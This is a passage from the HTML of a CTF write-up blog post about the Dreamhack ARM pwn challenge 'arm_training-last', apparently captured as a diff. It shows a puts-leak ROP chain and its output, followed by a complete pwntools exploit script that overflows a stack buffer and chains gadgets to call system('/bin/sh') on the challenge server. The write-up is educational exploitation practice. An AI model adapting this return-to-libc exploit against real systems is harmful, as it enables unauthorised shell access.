+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#rbp/r11</span>
+</span></span><span style="display:flex;"><span>            p32(pop_r3_pc) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            p32(puts_got) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p32(mov_r0_r3_pop_r11_pc) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p32(puts_plt)
+</span></span><span style="display:flex;"><span>            )
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>starting counter now
+</span></span><span style="display:flex;"><span>len of payload is 0x48
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>f0k<span style="color:#ae81ff">\x</span>e8?<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">01</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
+</span></span><span style="display:flex;"><span>$  
+</span></span></code></pre></div><p>Now, we just need to do this again, except calling <code>system</code>. I tried to go back to <code>main</code> (failed though).</p>
+<p>But, as I ran this twice, failing to reach <code>main</code>, I got the same <code>libc</code> offset&hellip; Is this also statically linked? That would make everything a lot easier&hellip;</p>
+<p>I assumed it was, crafted a new payload, and&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>leaked_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3fe86bf0</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_puts <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span></code></pre></div><p>Well, it was! I ran the exploit remotely, and got the flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/armtraininglast-writeup/flag.png#center"></p>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/armtraining/arm_training-last&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/armtraining/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;arm&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:14341&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>leaked_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3fe86bf0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_puts <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;) &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stop&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;starting counter now&#34;</span>)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">26</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;) &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;n&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_r3_pc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00010480</span>
+</span></span><span style="display:flex;"><span>mov_r0_r3_pop_r11_pc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000106e4</span>
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x106f4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> ( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#auStack38</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">19</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#abStack_24</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#response</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#local_d</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>  <span style="color:#f92672">+</span> <span style="color:#75715e">#counter</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#rbp/r11</span>
+</span></span><span style="display:flex;"><span>            p32(pop_r3_pc) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            p32(binsh) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p32(mov_r0_r3_pop_r11_pc) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p32(system) 
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>           
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;len of payload is </span><span style="color:#e6db74">{</span>hex(len(payload))<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#data = p.recv(4)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#val = u32(data.ljust(4, b&#34;\x00&#34;))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(f&#34;leaked is {hex(val)}&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/armtraining.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
